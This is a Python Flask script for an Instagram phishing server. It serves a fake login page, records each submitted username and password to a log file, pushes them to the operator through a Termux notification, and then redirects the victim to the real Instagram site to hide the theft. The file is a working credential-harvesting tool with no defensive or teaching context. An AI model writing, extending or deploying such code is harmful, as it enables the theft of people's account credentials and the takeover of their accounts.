from flask import Flask, render_template, render_template_string, request, session, redirect
import subprocess
from datetime import datetime
from colorama import Fore, Back, Style


app = Flask(__name__, template_folder='.site', static_folder='.site')
app.secret_key="timepass"                                             
                                             



def note(text, text2):
  subprocess.run(['termux-notification', '-t', text, '-c', text2, '--ongoing', '-i' ,'"hi"'])


def make_file(file, data):
    with open(file, 'a') as filedata:
      filedata.write(Fore.CYAN+f"""file name : {file} 
                     data : {data}
                     time : {datetime.now()}\n""")



@app.route('/', methods=['POST', 'GET'])
def index():
    return render_template("admin.html")


@app.route('/instagram', methods=['POST', 'GET'])
def instagram():
  if request.method == 'POST':
    session['name'] = request.form['uname']
    session['pass'] = request.form['password']
    data = f"""\nusername : {session['name']} \npassword : {session['pass']} \n
"""
    make_file("log.txt", data)      
    print(Fore.GREEN +f"log been save ! {data}")
    note("🚨🔥 message", data)
    print(Fore.LIGHTBLACK_EX +"notification been send ")
    return redirect("https://www.instagram.com/")
  return render_template("index.html")





if __name__ == '__main__':
    print(Fore.GREEN +"server logs ")
    app.run(debug=True, host="0.0.0.0", port=8080)
    

